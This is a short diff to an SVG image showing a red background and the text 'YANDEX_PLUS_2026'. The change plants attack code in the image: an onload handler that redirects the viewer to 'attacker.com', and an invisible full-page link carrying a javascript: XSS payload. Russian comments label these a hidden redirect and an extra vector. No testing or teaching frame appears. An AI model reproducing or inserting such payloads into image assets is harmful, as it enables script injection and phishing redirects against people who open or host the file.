@@ -1,8 +1,13 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="window.location.href='https://attacker.com'">
   <!-- Красный фон -->
   <rect width="100%" height="100%" fill="#cc0000"/>
   
-  <!-- Текст в центре, черный, крупный -->
+  <!-- Скрытый редирект через <a> (дополнительный вектор) -->
+  <a href="javascript:alert('XSS via SVG!')">
+    <rect width="100%" height="100%" fill="transparent"/>
+  </a>
+  
+  <!-- Видимый текст в центре -->
   <text x="50%" y="50%" font-size="3" fill="black" font-family="Arial" text-anchor="middle" dominant-baseline="central">
     YANDEX_PLUS_2026
   </text>
